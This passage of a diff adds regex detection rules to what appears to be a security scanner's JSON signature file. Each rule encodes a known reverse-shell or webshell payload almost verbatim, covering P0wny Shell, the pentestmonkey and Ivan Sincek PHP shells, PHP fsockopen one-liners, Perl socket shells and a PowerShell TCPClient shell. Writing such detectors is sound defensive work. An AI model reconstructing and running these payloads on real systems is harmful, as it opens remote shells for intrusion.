\|\\s+__/\\s+\\|\\s+\\|_\\s+\\|_\\s+_\\|<span></span>\\\\r\\s+\\|\\s+\\.__/\\s+\\\\___/\\s+\\\\_/\\\\_/\\s+\\|_\\|\\s+\\|_\\|\\\\__,\\s+\\|\\\\\\s+\\\\__,_\\|___/_\\|\\s+\\|_\\|\\\\___\\|_\\|_\\(_\\)\\s+\\|_\\|\\|_\\|\\s+<span></span>\\\\r\\s+\\|_\\|\\s+\\|___/\\s+\\\\____/\\s+<span></span>\\\\r\\s+</div>\\\\r\\s+</pre>\\\\r\\s+<div\\s+id=\"shell\\-input\">\\\\r\\s+<label\\s+for=\"shell\\-cmd\"\\s+id=\"shell\\-prompt\"\\s+class=\"shell\\-prompt\">\\?\\?\\?</label>\\\\r\\s+<div>\\\\r\\s+<input\\s+id=\"shell\\-cmd\"\\s+name=\"cmd\"\\s+onkeydown=\"_onShellCmdKeyDown\\(event\\)\"/>\\\\r\\s+</div>\\\\r\\s+</div>\\\\r\\s+</div>\\\\r\\s+</body>\\\\r\\s+\\\\r\\s+</html>",
+      "description": "Reverse shell payload (P0wny Shell (Webshell)) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-037",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "php\\s+\\-r\\s+'\\$😀=\"1\";\\$😁=\"2\";\\$😅=\"3\";\\$😆=\"4\";\\$😉=\"5\";\\$😊=\"6\";\\$😎=\"7\";\\$😍=\"8\";\\$😚=\"9\";\\$🙂=\"0\";\\$🤢=\"\\s+\";\\$🤓=\"<\";\\$🤠=\">\";\\$😱=\"\\-\";\\$😵=\"\\&\";\\$🤩=\"i\";\\$🤔=\"\\.\";\\$🤨=\"/\";\\$🥰=\"a\";\\$😐=\"b\";\\$😶=\"i\";\\$🙄=\"h\";\\$😂=\"c\";\\$🤣=\"d\";\\$😃=\"e\";\\$😄=\"f\";\\$😋=\"k\";\\$😘=\"n\";\\$😗=\"o\";\\$😙=\"p\";\\$🤗=\"s\";\\$😑=\"x\";\\$💀\\s+=\\s+\\$😄\\.\\s+\\$🤗\\.\\s+\\$😗\\.\\s+\\$😂\\.\\s+\\$😋\\.\\s+\\$😗\\.\\s+\\$😙\\.\\s+\\$😃\\.\\s+\\$😘;\\$🚀\\s+=\\s+\"[\\w.\\-]+\";\\$💻\\s+=\\s+\\d+;\\$🐚\\s+=\\s+\"\\S+\"\\.\\s+\\$🤢\\.\\s+\\$😱\\.\\s+\\$🤩\\.\\s+\\$🤢\\.\\s+\\$🤓\\.\\s+\\$😵\\.\\s+\\$😅\\.\\s+\\$🤢\\.\\s+\\$🤠\\.\\s+\\$😵\\.\\s+\\$😅\\.\\s+\\$🤢\\.\\s+\\$😁\\.\\s+\\$🤠\\.\\s+\\$😵\\.\\s+\\$😅;\\$🤣\\s+=\\s+\\$💀\\(\\$🚀,\\$💻\\);\\$👽\\s+=\\s+\\$😃\\.\\s+\\$😑\\.\\s+\\$😃\\.\\s+\\$😂;\\$👽\\(\\$🐚\\);'",
+      "description": "Reverse shell payload (PHP Emoji) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-038",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "<\\?php\\s+//\\s+Copyright\\s+\\(c\\)\\s+2020\\s+Ivan\\s+Sincek\\s+//\\s+v2\\.3\\s+//\\s+Requires\\s+PHP\\s+v5\\.0\\.0\\s+or\\s+greater\\.\\s+//\\s+Works\\s+on\\s+Linux\\s+OS,\\s+macOS,\\s+and\\s+Windows\\s+OS\\.\\s+//\\s+See\\s+the\\s+original\\s+script\\s+at\\s+https://github\\.com/pentestmonkey/php\\-reverse\\-shell\\.\\s+class\\s+Shell\\s+\\{\\s+private\\s+\\$addr\\s+=\\s+null;\\s+private\\s+\\$port\\s+=\\s+null;\\s+private\\s+\\$os\\s+=\\s+null;\\s+private\\s+\\$shell\\s+=\\s+null;\\s+private\\s+\\$descriptorspec\\s+=\\s+array\\(\\s+0\\s+=>\\s+array\\(\\\\'pipe\\\\',\\s+\\\\'r\\\\'\\),\\s+//\\s+shell\\s+can\\s+read\\s+from\\s+STDIN\\s+1\\s+=>\\s+array\\(\\\\'pipe\\\\',\\s+\\\\'w\\\\'\\),\\s+//\\s+shell\\s+can\\s+write\\s+to\\s+STDOUT\\s+2\\s+=>\\s+array\\(\\\\'pipe\\\\',\\s+\\\\'w\\\\'\\)\\s+//\\s+shell\\s+can\\s+write\\s+to\\s+STDERR\\s+\\);\\s+private\\s+\\$buffer\\s+=\\s+1024;\\s+//\\s+read/write\\s+buffer\\s+size\\s+private\\s+\\$clen\\s+=\\s+0;\\s+//\\s+command\\s+length\\s+private\\s+\\$error\\s+=\\s+false;\\s+//\\s+stream\\s+read/write\\s+error\\s+public\\s+function\\s+__construct\\(\\$addr,\\s+\\$port\\)\\s+\\S+\\s+private\\s+function\\s+detect\\(\\)\\s+\\{\\s+\\$detected\\s+=\\s+true;\\s+if\\s+\\(stripos\\(PHP_OS,\\s+\\\\'LINUX\\\\'\\)\\s+!==\\s+false\\)\\s+\\S+\\s+else\\s+if\\s+\\(stripos\\(PHP_OS,\\s+\\\\'WIN32\\\\'\\)\\s+!==\\s+false\\s+\\|\\|\\s+stripos\\(PHP_OS,\\s+\\\\'WINNT\\\\'\\)\\s+!==\\s+false\\s+\\|\\|\\s+stripos\\(PHP_OS,\\s+\\\\'WINDOWS\\\\'\\)\\s+!==\\s+false\\)\\s+\\S+\\s+else\\s+\\S+\\s+return\\s+\\$detected;\\s+\\}\\s+private\\s+function\\s+daemonize\\(\\)\\s+\\{\\s+\\$exit\\s+=\\s+false;\\s+if\\s+\\(!function_exists\\(\\\\'pcntl_fork\\\\'\\)\\)\\s+\\S+\\s+else\\s+if\\s+\\(\\(\\$pid\\s+=\\s+@pcntl_fork\\(\\)\\)\\s+<\\s+0\\)\\s+\\S+\\s+else\\s+if\\s+\\(\\$pid\\s+>\\s+0\\)\\s+\\S+\\s+else\\s+if\\s+\\(posix_setsid\\(\\)\\s+<\\s+0\\)\\s+\\S+\\s+else\\s+\\S+\\s+return\\s+\\$exit;\\s+\\}\\s+private\\s+function\\s+settings\\(\\)\\s+\\S+\\s+private\\s+function\\s+dump\\(\\$data\\)\\s+\\S+\\s+private\\s+function\\s+read\\(\\$stream,\\s+\\$name,\\s+\\$buffer\\)\\s+\\{\\s+if\\s+\\(\\(\\$data\\s+=\\s+@fread\\(\\$stream,\\s+\\$buffer\\)\\)\\s+===\\s+false\\)\\s+\\{\\s+//\\s+suppress\\s+an\\s+error\\s+when\\s+reading\\s+from\\s+a\\s+closed\\s+blocking\\s+stream\\s+\\$this\\->error\\s+=\\s+true;\\s+//\\s+set\\s+global\\s+error\\s+flag\\s+echo\\s+\"STRM_ERROR:\\s+Cannot\\s+read\\s+from\\s+\\$\\S+,\\s+script\\s+will\\s+now\\s+exit\\.\\.\\.\\s+\";\\s+\\}\\s+return\\s+\\$data;\\s+\\}\\s+private\\s+function\\s+write\\(\\$stream,\\s+\\$name,\\s+\\$data\\)\\s+\\{\\s+if\\s+\\(\\(\\$bytes\\s+=\\s+@fwrite\\(\\$stream,\\s+\\$data\\)\\)\\s+===\\s+false\\)\\s+\\{\\s+//\\s+suppress\\s+an\\s+error\\s+when\\s+writing\\s+to\\s+a\\s+closed\\s+blocking\\s+stream\\s+\\$this\\->error\\s+=\\s+true;\\s+//\\s+set\\s+global\\s+error\\s+flag\\s+echo\\s+\"STRM_ERROR:\\s+Cannot\\s+write\\s+to\\s+\\$\\S+,\\s+script\\s+will\\s+now\\s+exit\\.\\.\\.\\s+\";\\s+\\}\\s+return\\s+\\$bytes;\\s+\\}\\s+//\\s+read/write\\s+method\\s+for\\s+non\\-blocking\\s+streams\\s+private\\s+function\\s+rw\\(\\$input,\\s+\\$output,\\s+\\$iname,\\s+\\$oname\\)\\s+\\{\\s+while\\s+\\(\\(\\$data\\s+=\\s+\\$this\\->read\\(\\$input,\\s+\\$iname,\\s+\\$this\\->buffer\\)\\)\\s+\\&\\&\\s+\\$this\\->write\\(\\$output,\\s+\\$oname,\\s+\\$data\\)\\)\\s+\\{\\s+if\\s+\\(\\$this\\->os\\s+===\\s+\\\\'WINDOWS\\\\'\\s+\\&\\&\\s+\\$oname\\s+===\\s+\\\\'STDIN\\\\'\\)\\s+\\S+\\s+//\\s+calculate\\s+the\\s+command\\s+length\\s+\\$this\\->dump\\(\\$data\\);\\s+//\\s+script\\\\'s\\s+dump\\s+\\}\\s+\\}\\s+//\\s+read/write\\s+method\\s+for\\s+blocking\\s+streams\\s+\\(e\\.g\\.\\s+for\\s+STDOUT\\s+and\\s+STDERR\\s+on\\s+Windows\\s+OS\\)\\s+//\\s+we\\s+must\\s+read\\s+the\\s+exact\\s+byte\\s+length\\s+from\\s+a\\s+stream\\s+and\\s+not\\s+a\\s+single\\s+byte\\s+more\\s+private\\s+function\\s+brw\\(\\$input,\\s+\\$output,\\s+\\$iname,\\s+\\$oname\\)\\s+\\{\\s+\\$fstat\\s+=\\s+fstat\\(\\$input\\);\\s+\\$size\\s+=\\s+\\$fstat\\[\\\\'size\\\\'\\];\\s+if\\s+\\(\\$this\\->os\\s+===\\s+\\\\'WINDOWS\\\\'\\s+\\&\\&\\s+\\$iname\\s+===\\s+\\\\'STDOUT\\\\'\\s+\\&\\&\\s+\\$this\\->clen\\)\\s+\\{\\s+//\\s+for\\s+some\\s+reason\\s+Windows\\s+OS\\s+pipes\\s+STDIN\\s+into\\s+STDOUT\\s+//\\s+we\\s+do\\s+not\\s+like\\s+that\\s+//\\s+we\\s+need\\s+to\\s+discard\\s+the\\s+data\\s+from\\s+the\\s+stream\\s+while\\s+\\(\\$this\\->clen\\s+>\\s+0\\s+\\&\\&\\s+\\(\\$bytes\\s+=\\s+\\$this\\->clen\\s+>=\\s+\\$this\\->buffer\\s+\\?\\s+\\$this\\->buffer\\s+:\\s+\\$this\\->clen\\)\\s+\\&\\&\\s+\\$this\\->read\\(\\$input,\\s+\\$iname,\\s+\\$bytes\\)\\)\\s+\\S+\\s+\\}\\s+while\\s+\\(\\$size\\s+>\\s+0\\s+\\&\\&\\s+\\(\\$bytes\\s+=\\s+\\$size\\s+>=\\s+\\$this\\->buffer\\s+\\?\\s+\\$this\\->buffer\\s+:\\s+\\$size\\)\\s+\\&\\&\\s+\\(\\$data\\s+=\\s+\\$this\\->read\\(\\$input,\\s+\\$iname,\\s+\\$bytes\\)\\)\\s+\\&\\&\\s+\\$this\\->write\\(\\$output,\\s+\\$oname,\\s+\\$data\\)\\)\\s+\\S+\\s+\\}\\s+public\\s+function\\s+run\\(\\)\\s+\\{\\s+if\\s+\\(\\$this\\->detect\\(\\)\\s+\\&\\&\\s+!\\$this\\->daemonize\\(\\)\\)\\s+\\{\\s+\\$this\\->settings\\(\\);\\s+//\\s+\\-\\-\\-\\-\\-\\s+SOCKET\\s+BEGIN\\s+\\-\\-\\-\\-\\-\\s+\\$socket\\s+=\\s+@fsockopen\\(\\$this\\->addr,\\s+\\$this\\->port,\\s+\\$errno,\\s+\\$errstr,\\s+30\\);\\s+if\\s+\\(!\\$socket\\)\\s+\\{\\s+echo\\s+\"SOC_ERROR:\\s+\\S+:\\s+\\S+\\s+\";\\s+\\}\\s+else\\s+\\{\\s+stream_set_blocking\\(\\$socket,\\s+false\\);\\s+//\\s+set\\s+the\\s+socket\\s+stream\\s+to\\s+non\\-blocking\\s+mode\\s+\\|\\s+returns\\s+\\\\'true\\\\'\\s+on\\s+Windows\\s+OS\\s+//\\s+\\-\\-\\-\\-\\-\\s+SHELL\\s+BEGIN\\s+\\-\\-\\-\\-\\-\\s+\\$process\\s+=\\s+@proc_open\\(\\$this\\->shell,\\s+\\$this\\->descriptorspec,\\s+\\$pipes,\\s+null,\\s+null\\);\\s+if\\s+\\(!\\$process\\)\\s+\\S+\\s+else\\s+\\{\\s+foreach\\s+\\(\\$pipes\\s+as\\s+\\$pipe\\)\\s+\\S+\\s+//\\s+\\-\\-\\-\\-\\-\\s+WORK\\s+BEGIN\\s+\\-\\-\\-\\-\\-\\s+\\$status\\s+=\\s+proc_get_status\\(\\$process\\);\\s+@fwrite\\(\\$socket,\\s+\"SOCKET:\\s+Shell\\s+has\\s+connected!\\s+PID:\\s+\"\\s+\\.\\s+\\$status\\[\\\\'pid\\\\'\\]\\s+\\.\\s+\"\\s+\"\\);\\s+do\\s+\\{\\s+\\$status\\s+=\\s+proc_get_status\\(\\$process\\);\\s+if\\s+\\(feof\\(\\$socket\\)\\)\\s+\\S+\\s+else\\s+if\\s+\\(feof\\(\\$pipes\\[1\\]\\)\\s+\\|\\|\\s+!\\$status\\[\\\\'running\\\\'\\]\\)\\s+\\S+\\s+//\\s+use\\s+proc_get_status\\(\\)\\s+instead\\s+\\$streams\\s+=\\s+array\\(\\s+\\\\'read\\\\'\\s+=>\\s+array\\(\\$socket,\\s+\\$pipes\\[1\\],\\s+\\$pipes\\[2\\]\\),\\s+//\\s+SOCKET\\s+\\|\\s+STDOUT\\s+\\|\\s+STDERR\\s+\\\\'write\\\\'\\s+=>\\s+null,\\s+\\\\'except\\\\'\\s+=>\\s+null\\s+\\);\\s+\\$num_changed_streams\\s+=\\s+@stream_select\\(\\$streams\\[\\\\'read\\\\'\\],\\s+\\$streams\\[\\\\'write\\\\'\\],\\s+\\$streams\\[\\\\'except\\\\'\\],\\s+0\\);\\s+//\\s+wait\\s+for\\s+stream\\s+changes\\s+\\|\\s+will\\s+not\\s+wait\\s+on\\s+Windows\\s+OS\\s+if\\s+\\(\\$num_changed_streams\\s+===\\s+false\\)\\s+\\S+\\s+else\\s+if\\s+\\(\\$num_changed_streams\\s+>\\s+0\\)\\s+\\{\\s+if\\s+\\(\\$this\\->os\\s+===\\s+\\\\'LINUX\\\\'\\)\\s+\\{\\s+if\\s+\\(in_array\\(\\$socket\\s+,\\s+\\$streams\\[\\\\'read\\\\'\\]\\)\\)\\s+\\S+\\s+//\\s+read\\s+from\\s+SOCKET\\s+and\\s+write\\s+to\\s+STDIN\\s+if\\s+\\(in_array\\(\\$pipes\\[2\\],\\s+\\$streams\\[\\\\'read\\\\'\\]\\)\\)\\s+\\S+\\s+//\\s+read\\s+from\\s+STDERR\\s+and\\s+write\\s+to\\s+SOCKET\\s+if\\s+\\(in_array\\(\\$pipes\\[1\\],\\s+\\$streams\\[\\\\'read\\\\'\\]\\)\\)\\s+\\S+\\s+//\\s+read\\s+from\\s+STDOUT\\s+and\\s+write\\s+to\\s+SOCKET\\s+\\}\\s+else\\s+if\\s+\\(\\$this\\->os\\s+===\\s+\\\\'WINDOWS\\\\'\\)\\s+\\{\\s+//\\s+order\\s+is\\s+important\\s+if\\s+\\(in_array\\(\\$socket,\\s+\\$streams\\[\\\\'read\\\\'\\]\\)/\\*\\-\\-\\-\\-\\-\\-\\*/\\)\\s+\\S+\\s+//\\s+read\\s+from\\s+SOCKET\\s+and\\s+write\\s+to\\s+STDIN\\s+if\\s+\\(\\(\\$fstat\\s+=\\s+fstat\\(\\$pipes\\[2\\]\\)\\)\\s+\\&\\&\\s+\\$fstat\\[\\\\'size\\\\'\\]\\)\\s+\\S+\\s+//\\s+read\\s+from\\s+STDERR\\s+and\\s+write\\s+to\\s+SOCKET\\s+if\\s+\\(\\(\\$fstat\\s+=\\s+fstat\\(\\$pipes\\[1\\]\\)\\)\\s+\\&\\&\\s+\\$fstat\\[\\\\'size\\\\'\\]\\)\\s+\\S+\\s+//\\s+read\\s+from\\s+STDOUT\\s+and\\s+write\\s+to\\s+SOCKET\\s+\\}\\s+\\}\\s+\\}\\s+while\\s+\\(!\\$this\\->error\\);\\s+//\\s+\\-\\-\\-\\-\\-\\-\\s+WORK\\s+END\\s+\\-\\-\\-\\-\\-\\-\\s+foreach\\s+\\(\\$pipes\\s+as\\s+\\$pipe\\)\\s+\\S+\\s+proc_close\\(\\$process\\);\\s+\\}\\s+//\\s+\\-\\-\\-\\-\\-\\-\\s+SHELL\\s+END\\s+\\-\\-\\-\\-\\-\\-\\s+fclose\\(\\$socket\\);\\s+\\}\\s+//\\s+\\-\\-\\-\\-\\-\\-\\s+SOCKET\\s+END\\s+\\-\\-\\-\\-\\-\\-\\s+\\}\\s+\\}\\s+\\}\\s+echo\\s+\\\\'<pre>\\\\';\\s+//\\s+change\\s+the\\s+host\\s+address\\s+and/or\\s+port\\s+number\\s+as\\s+necessary\\s+\\$sh\\s+=\\s+new\\s+Shell\\(\\\\'[\\w.\\-]+\\\\',\\s+\\d+\\);\\s+\\$sh\\->run\\(\\);\\s+unset\\(\\$sh\\);\\s+//\\s+garbage\\s+collector\\s+requires\\s+PHP\\s+v5\\.3\\.0\\s+or\\s+greater\\s+//\\s+@gc_collect_cycles\\(\\);\\s+echo\\s+\\\\'</pre>\\\\';\\s+\\?>",
+      "description": "Reverse shell payload (PHP Ivan Sincek) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-039",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "<\\?php\\s+//\\s+php\\-reverse\\-shell\\s+\\-\\s+A\\s+Reverse\\s+Shell\\s+implementation\\s+in\\s+PHP\\.\\s+Comments\\s+stripped\\s+to\\s+slim\\s+it\\s+down\\.\\s+RE:\\s+https://raw\\.githubusercontent\\.com/pentestmonkey/php\\-reverse\\-shell/master/php\\-reverse\\-shell\\.php\\s+//\\s+Copyright\\s+\\(C\\)\\s+2007\\s+pentestmonkey@pentestmonkey\\.net\\s+set_time_limit\\s+\\(0\\);\\s+\\$VERSION\\s+=\\s+\"1\\.0\";\\s+\\$ip\\s+=\\s+'[\\w.\\-]+';\\s+\\$port\\s+=\\s+\\d+;\\s+\\$chunk_size\\s+=\\s+1400;\\s+\\$write_a\\s+=\\s+null;\\s+\\$error_a\\s+=\\s+null;\\s+\\$shell\\s+=\\s+'uname\\s+\\-a;\\s+w;\\s+id;\\s+\\S+\\s+\\-i';\\s+\\$daemon\\s+=\\s+0;\\s+\\$debug\\s+=\\s+0;\\s+if\\s+\\(function_exists\\('pcntl_fork'\\)\\)\\s+\\{\\s+\\$pid\\s+=\\s+pcntl_fork\\(\\);\\s+if\\s+\\(\\$pid\\s+==\\s+\\-1\\)\\s+\\S+\\s+if\\s+\\(\\$pid\\)\\s+\\S+\\s+if\\s+\\(posix_setsid\\(\\)\\s+==\\s+\\-1\\)\\s+\\S+\\s+\\$daemon\\s+=\\s+1;\\s+\\}\\s+else\\s+\\S+\\s+chdir\\(\"/\"\\);\\s+umask\\(0\\);\\s+//\\s+Open\\s+reverse\\s+connection\\s+\\$sock\\s+=\\s+fsockopen\\(\\$ip,\\s+\\$port,\\s+\\$errno,\\s+\\$errstr,\\s+30\\);\\s+if\\s+\\(!\\$sock\\)\\s+\\S+\\s+\\$descriptorspec\\s+=\\s+array\\(\\s+0\\s+=>\\s+array\\(\"pipe\",\\s+\"r\"\\),\\s+//\\s+stdin\\s+is\\s+a\\s+pipe\\s+that\\s+the\\s+child\\s+will\\s+read\\s+from\\s+1\\s+=>\\s+array\\(\"pipe\",\\s+\"w\"\\),\\s+//\\s+stdout\\s+is\\s+a\\s+pipe\\s+that\\s+the\\s+child\\s+will\\s+write\\s+to\\s+2\\s+=>\\s+array\\(\"pipe\",\\s+\"w\"\\)\\s+//\\s+stderr\\s+is\\s+a\\s+pipe\\s+that\\s+the\\s+child\\s+will\\s+write\\s+to\\s+\\);\\s+\\$process\\s+=\\s+proc_open\\(\\$shell,\\s+\\$descriptorspec,\\s+\\$pipes\\);\\s+if\\s+\\(!is_resource\\(\\$process\\)\\)\\s+\\S+\\s+stream_set_blocking\\(\\$pipes\\[0\\],\\s+0\\);\\s+stream_set_blocking\\(\\$pipes\\[1\\],\\s+0\\);\\s+stream_set_blocking\\(\\$pipes\\[2\\],\\s+0\\);\\s+stream_set_blocking\\(\\$sock,\\s+0\\);\\s+printit\\(\"Successfully\\s+opened\\s+reverse\\s+shell\\s+to\\s+\\$ip:\\$port\"\\);\\s+while\\s+\\(1\\)\\s+\\{\\s+if\\s+\\(feof\\(\\$sock\\)\\)\\s+\\S+\\s+if\\s+\\(feof\\(\\$pipes\\[1\\]\\)\\)\\s+\\S+\\s+\\$read_a\\s+=\\s+array\\(\\$sock,\\s+\\$pipes\\[1\\],\\s+\\$pipes\\[2\\]\\);\\s+\\$num_changed_sockets\\s+=\\s+stream_select\\(\\$read_a,\\s+\\$write_a,\\s+\\$error_a,\\s+null\\);\\s+if\\s+\\(in_array\\(\\$sock,\\s+\\$read_a\\)\\)\\s+\\S+\\s+if\\s+\\(in_array\\(\\$pipes\\[1\\],\\s+\\$read_a\\)\\)\\s+\\S+\\s+if\\s+\\(in_array\\(\\$pipes\\[2\\],\\s+\\$read_a\\)\\)\\s+\\S+\\s+\\}\\s+fclose\\(\\$sock\\);\\s+fclose\\(\\$pipes\\[0\\]\\);\\s+fclose\\(\\$pipes\\[1\\]\\);\\s+fclose\\(\\$pipes\\[2\\]\\);\\s+proc_close\\(\\$process\\);\\s+function\\s+printit\\s+\\(\\$string\\)\\s+\\{\\s+if\\s+\\(!\\$daemon\\)\\s+\\S+\\s+\\}\\s+\\?>",
+      "description": "Reverse shell payload (PHP PentestMonkey) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-040",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "php\\s+\\-r\\s+'\\$sock=fsockopen\\(\"[\\w.\\-]+\",\\d+\\);`\\S+\\s+<\\&3\\s+>\\&3\\s+2>\\&3`;'",
+      "description": "Reverse shell payload (PHP `) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-041",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "<html>\\s+<body>\\s+<form\\s+method=\"GET\"\\s+name=\"<\\?php\\s+echo\\s+basename\\(\\$_SERVER\\[\\\\'PHP_SELF\\\\'\\]\\);\\s+\\?>\">\\s+<input\\s+type=\"TEXT\"\\s+name=\"cmd\"\\s+id=\"cmd\"\\s+size=\"80\">\\s+<input\\s+type=\"SUBMIT\"\\s+value=\"Execute\">\\s+</form>\\s+<pre>\\s+<\\?php\\s+if\\(isset\\(\\$_GET\\[\\\\'cmd\\\\'\\]\\)\\)\\s+\\S+\\s+\\?>\\s+</pre>\\s+</body>\\s+<script>document\\.getElementById\\(\"cmd\"\\)\\.focus\\(\\);</script>\\s+</html>",
+      "description": "Reverse shell payload (PHP cmd) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-042",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "<\\?php\\s+if\\(isset\\(\\$_REQUEST\\[\"cmd\"\\]\\)\\)\\S+\\?>",
+      "description": "Reverse shell payload (PHP cmd 2) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-043",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "<\\?=`\\$_GET\\[0\\]`\\?>",
+      "description": "Reverse shell payload (PHP cmd small) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-044",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "php\\s+\\-r\\s+'\\$sock=fsockopen\\(\"[\\w.\\-]+\",\\d+\\);exec\\(\"\\S+\\s+<\\&3\\s+>\\&3\\s+2>\\&3\"\\);'",
+      "description": "Reverse shell payload (PHP exec) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-045",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "php\\s+\\-r\\s+'\\$sock=fsockopen\\(\"[\\w.\\-]+\",\\d+\\);passthru\\(\"\\S+\\s+<\\&3\\s+>\\&3\\s+2>\\&3\"\\);'",
+      "description": "Reverse shell payload (PHP passthru) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-046",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "php\\s+\\-r\\s+'\\$sock=fsockopen\\(\"[\\w.\\-]+\",\\d+\\);popen\\(\"\\S+\\s+<\\&3\\s+>\\&3\\s+2>\\&3\",\\s+\"r\"\\);'",
+      "description": "Reverse shell payload (PHP popen) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-047",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "php\\s+\\-r\\s+'\\$s=fsockopen\\(\"[\\w.\\-]+\",\\d+\\);proc_open\\(\"\\S+\",\\[\\$s,\\$s,\\$s\\],\\$p\\);'",
+      "description": "Reverse shell payload (PHP proc_open) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-048",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "php\\s+\\-r\\s+'\\$sock=fsockopen\\(\"[\\w.\\-]+\",\\d+\\);shell_exec\\(\"\\S+\\s+<\\&3\\s+>\\&3\\s+2>\\&3\"\\);'",
+      "description": "Reverse shell payload (PHP shell_exec) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-049",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "php\\s+\\-r\\s+'\\$sock=fsockopen\\(\"[\\w.\\-]+\",\\d+\\);system\\(\"\\S+\\s+<\\&3\\s+>\\&3\\s+2>\\&3\"\\);'",
+      "description": "Reverse shell payload (PHP system) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-050",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "perl\\s+\\-e\\s+'use\\s+Socket;\\$i=\"[\\w.\\-]+\";\\$p=\\d+;socket\\(S,PF_INET,SOCK_STREAM,getprotobyname\\(\"tcp\"\\)\\);if\\(connect\\(S,sockaddr_in\\(\\$p,inet_aton\\(\\$i\\)\\)\\)\\)\\S+;'",
+      "description": "Reverse shell payload (Perl) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-051",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "perl\\s+\\-MIO\\s+\\-e\\s+'\\$p=fork;exit,if\\(\\$p\\);\\$c=new\\s+IO::Socket::INET\\(PeerAddr,\"[\\w.\\-]+:\\d+\"\\);STDIN\\->fdopen\\(\\$c,r\\);\\$\\~\\->fdopen\\(\\$c,w\\);system\\$_\\s+while<>;'",
+      "description": "Reverse shell payload (Perl no sh) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-052",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "\\$LHOST\\s+=\\s+\"[\\w.\\-]+\";\\s+\\$LPORT\\s+=\\s+\\d+;\\s+\\$TCPClient\\s+=\\s+New\\-Object\\s+Net\\.Sockets\\.TCPClient\\(\\$LHOST,\\s+\\$LPORT\\);\\s+\\$NetworkStream\\s+=\\s+\\$TCPClient\\.GetStream\\(\\);\\s+\\$StreamReader\\s+=\\s+New\\-Object\\s+IO\\.StreamReader\\(\\$NetworkStream\\);\\s+\\$StreamWriter\\s+=\\s+New\\-Object\\s+IO\\.StreamWriter\\(\\$NetworkStream\\);\\s+\\$StreamWriter\\.AutoFlush\\s+=\\s+\\$true;\\s+\\$Buffer\\s+=\\s+New\\-Object\\s+System\\.Byte\\[\\]\\s+1024;\\s+while\\s+\\(\\$TCPClient\\.Connected\\)\\s+\\{\\s+while\\s+\\(\\$NetworkStream\\.DataAvailable\\)\\s+\\S+;\\s+if\\s+\\(\\$TCPClient\\.Connected\\s+\\-and\\s+\\$Code\\.Length\\s+\\-gt\\s+1\\)\\s+\\{\\s+\\$Output\\s+=\\s+try\\s+\\S+\\s+catch\\s+\\S+;\\s+\\$StreamWriter\\.Write\\(\"\\$Output`n\"\\);\\s+\\$Code\\s+=\\s+\\$null\\s+\\}\\s+\\};\\s+\\$TCPClient\\.Close\\(\\);\\s+\\$NetworkStream\\.Close\\(\\);\\s+\\$StreamReader\\.Close\\(\\);\\s+\\$StreamWriter\\.Close\\(\\)",
+      "description": "Reverse shell payload (PowerShell #1) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-053",
+      "phase": "network_exfil",
+      "severity": "high",
